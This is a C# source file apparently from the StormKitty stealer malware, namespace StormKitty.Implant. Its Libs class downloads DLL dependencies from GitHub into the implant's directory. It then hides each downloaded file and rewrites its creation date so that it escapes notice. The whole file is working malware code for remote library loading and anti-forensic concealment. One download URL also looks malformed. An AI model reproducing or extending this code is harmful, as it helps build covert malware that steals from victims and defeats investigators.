using StormKitty.Implant;
using System;
using System.IO;
using System.Net;

namespace StormKitty
{
    internal sealed class Libs
    {
        
        public static string ZipLib = "https://github.com/LimerBoy/StormKitty/master/StormKitty/stub/packages/DotNetZip.1.13.8/lib/net40/DotNetZip.dll/raw/refs/heads/main/DotNetZip.dll";
        public static string JsonLib = "https://github.com/SANTIK-Genius/Newtonsoft.Json.dll/raw/refs/heads/main/Newtonsoft.Json.dll";
        public static bool LoadRemoteLibrary(string library)
        {
            string dll = Path.Combine(Path.GetDirectoryName(Startup.ExecutablePath), Path.GetFileName(new Uri(library).LocalPath));
            
            if (!File.Exists(dll))
            {
                try
                {
                    using (var client = new WebClient())
                        client.DownloadFile(library, dll);
                }
                catch (WebException)
                {
                    return false;
                }

                Startup.HideFile(dll);
                Startup.SetFileCreationDate(dll);
            }
            return File.Exists(dll);
        }
    }
}
